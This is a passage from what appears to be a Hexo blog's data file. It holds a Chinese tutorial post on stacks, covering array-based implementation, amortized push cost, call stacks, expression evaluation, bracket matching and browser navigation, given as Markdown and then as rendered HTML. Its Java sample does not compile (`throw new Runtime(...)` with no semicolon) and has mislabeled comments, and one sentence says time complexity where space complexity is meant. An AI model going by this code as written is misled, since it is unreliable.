%}\n\n这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：\n\n{% asset_img 浏览器栈3.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 总结\n{% endnote %}\n</div>\n\n栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 思考\n{% endnote %}\n</div>\n\n1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用\"栈\"这种数据结构来保存临时变量呢？用其他数据结构可以吗？\n2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？\n\n<br>\n","slug":"算法-栈","published":1,"updated":"2018-11-29T09:59:50.791Z","_id":"cjpdmv0au002q4cv0919ctq75","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>浏览器的前进、后退功能，我想你肯定很熟悉吧？</p>\n<p>当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。</p>\n<p>假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解栈？\"><a href=\"#如何理解栈？\" class=\"headerlink\" title=\"如何理解栈？\"></a>如何理解栈？</h3></div><br></div>\n\n<p>关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。<strong>先进者后出，后进者先出，这就是典型的栈结构</strong>。</p>\n<p>从栈的操作特性上来看，<strong>栈是一种操作受限的线性表</strong>，只允许在一端插入和删除数据。</p>\n<p>我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？</p>\n<p>事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。</p>\n<p><strong>当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何实现一个栈？\"><a href=\"#如何实现一个栈？\" class=\"headerlink\" title=\"如何实现一个栈？\"></a>如何实现一个栈？</h3></div><br></div>\n\n<p>从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。</p>\n<p>实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做<strong>顺序栈</strong>，用链表实现的栈，我们叫做<strong>链式栈</strong>。</p>\n<h4 id=\"基于数组实现的顺序栈\"><a href=\"#基于数组实现的顺序栈\" class=\"headerlink\" title=\"基于数组实现的顺序栈\"></a>基于数组实现的顺序栈</h4><p>我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的链式栈</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayStack</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">stack</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object [] DEFAULT_ARRAY = <span class=\"keyword\">new</span> Object[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span>  cap;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = DEFAULT_CAP;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.size = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = DEFAULT_ARRAY;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap &lt; <span class=\"number\">0</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">\"Illegal Capacity: \"</span>+ cap);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = <span class=\"keyword\">new</span> Object[cap];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size&lt;cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 数组满了</span></span><br><span class=\"line\">            data[size] = val;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Runtime(<span class=\"string\">\"stack is full!\"</span>)</span><br><span class=\"line\">          <span class=\"comment\">// 可以动态扩容的stack</span></span><br><span class=\"line\">          <span class=\"comment\">// Object[] objects = new Object[cap*2];</span></span><br><span class=\"line\">          <span class=\"comment\">// System.arraycopy(data, 0, objects, 0, size);</span></span><br><span class=\"line\">          <span class=\"comment\">// data = objects;</span></span><br><span class=\"line\">          <span class=\"comment\">// data[size] = val;</span></span><br><span class=\"line\">          <span class=\"comment\">// size ++;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        T result = (T) data[size-<span class=\"number\">1</span>];</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？</p>\n<p>不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。</p>\n<p>注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。</p>\n<p>时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。</p>\n<h4 id=\"支持动态扩容的顺序栈\"><a href=\"#支持动态扩容的顺序栈\" class=\"headerlink\" title=\"支持动态扩容的顺序栈\"></a>支持动态扩容的顺序栈</h4><p>刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？</p>\n<p>还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。</p>\n<p>所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。</p>\n<p>实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。</p>\n<p>对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。</p>\n<p>也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。</p>\n<p>为了分析方便，我们先做一些假设和定义：</p>\n<ul>\n<li>栈空间不够时，我们重新申请一个是原来大小两倍的数组；</li>\n<li>为了简化分析，假设只有入栈操作没有出栈操作；</li>\n<li>定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。</li>\n</ul>\n<p>如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：</p>\n\n<p>从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。</p>\n<p>通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"栈的应用场景\"><a href=\"#栈的应用场景\" class=\"headerlink\" title=\"栈的应用场景\"></a>栈的应用场景</h3></div><br></div>\n\n<h4 id=\"栈在函数调用中的应用\"><a href=\"#栈在函数调用中的应用\" class=\"headerlink\" title=\"栈在函数调用中的应用\"></a>栈在函数调用中的应用</h4><p>前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。</p>\n<p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ret = add(<span class=\"number\">3</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">  res = a + ret;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, res);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sum = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：</p>\n<img src=\"/posts/2018-09-15-算法-栈/函数栈.jpg\">\n<h4 id=\"栈在表达式求值中的应用\"><a href=\"#栈在表达式求值中的应用\" class=\"headerlink\" title=\"栈在表达式求值中的应用\"></a>栈在表达式求值中的应用</h4><p>我们再来看一个栈的常见应用场景，编译器如何利用栈实现<strong>表达式求值</strong>。</p>\n<p>这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？</p>\n<p>实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。</p>\n<p>这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。</p>\n<img src=\"/posts/2018-09-15-算法-栈/表达式栈图.jpg\">\n<h4 id=\"栈在括号匹配中的应用\"><a href=\"#栈在括号匹配中的应用\" class=\"headerlink\" title=\"栈在括号匹配中的应用\"></a>栈在括号匹配中的应用</h4><p>出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。</p>\n<p>我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？</p>\n<p>这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。</p>\n<p>当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。</p>\n<p>我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。</p>\n<p>当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈1.jpg\">\n<p>当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈2.jpg\">\n<p>这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈3.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3></div><br></div>\n\n<p>栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3></div><br></div>\n\n<p>1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？<br>2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？</p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>浏览器的前进、后退功能，我想你肯定很熟悉吧？</p>\n<p>当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。</p>\n<p>假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解栈？\"><a href=\"#如何理解栈？\" class=\"headerlink\" title=\"如何理解栈？\"></a>如何理解栈？</h3></div><br></div>\n\n<p>关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。<strong>先进者后出，后进者先出，这就是典型的栈结构</strong>。</p>\n<p>从栈的操作特性上来看，<strong>栈是一种操作受限的线性表</strong>，只允许在一端插入和删除数据。</p>\n<p>我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？</p>\n<p>事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。</p>\n<p><strong>当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何实现一个栈？\"><a href=\"#如何实现一个栈？\" class=\"headerlink\" title=\"如何实现一个栈？\"></a>如何实现一个栈？</h3></div><br></div>\n\n<p>从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。</p>\n<p>实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做<strong>顺序栈</strong>，用链表实现的栈，我们叫做<strong>链式栈</strong>。</p>\n<h4 id=\"基于数组实现的顺序栈\"><a href=\"#基于数组实现的顺序栈\" class=\"headerlink\" title=\"基于数组实现的顺序栈\"></a>基于数组实现的顺序栈</h4><p>我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的链式栈</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayStack</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">stack</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object [] DEFAULT_ARRAY = <span class=\"keyword\">new</span> Object[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span>  cap;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = DEFAULT_CAP;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.size = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = DEFAULT_ARRAY;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap &lt; <span class=\"number\">0</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">\"Illegal Capacity: \"</span>+ cap);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = <span class=\"keyword\">new</span> Object[cap];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size&lt;cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 数组满了</span></span><br><span class=\"line\">            data[size] = val;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Runtime(<span class=\"string\">\"stack is full!\"</span>)</span><br><span class=\"line\">          <span class=\"comment\">// 可以动态扩容的stack</span></span><br><span class=\"line\">          <span class=\"comment\">// Object[] objects = new Object[cap*2];</span></span><br><span class=\"line\">          <span class=\"comment\">// System.arraycopy(data, 0, objects, 0, size);</span></span><br><span class=\"line\">          <span class=\"comment\">// data = objects;</span></span><br><span class=\"line\">          <span class=\"comment\">// data[size] = val;</span></span><br><span class=\"line\">          <span class=\"comment\">// size ++;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        T result = (T) data[size-<span class=\"number\">1</span>];</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？</p>\n<p>不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。</p>\n<p>注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。</p>\n<p>时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。</p>\n<h4 id=\"支持动态扩容的顺序栈\"><a href=\"#支持动态扩容的顺序栈\" class=\"headerlink\" 